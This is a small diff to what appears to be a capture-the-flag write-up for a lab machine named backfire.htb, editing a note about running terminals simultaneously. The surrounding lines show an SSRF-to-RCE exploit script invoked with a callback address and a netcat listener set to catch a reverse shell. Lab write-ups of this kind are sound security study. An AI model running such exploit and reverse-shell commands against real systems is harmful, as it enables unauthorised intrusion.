@@ -392,7 +392,8 @@ python -m http.server
 ```
 sudo python3 SSRF_RCE.py -t https://backfire.htb -i 127.0.0.1 -p 40056
 ```
-(Note: Make sure they are in seperate terminals and run them one after another)
+(Note: Make sure they are in seperate terminals and run them all at once. I had to press them
+simultaneously)
 ### 🧑‍💻My Machine 
 ```
 nc -lnvp 40056
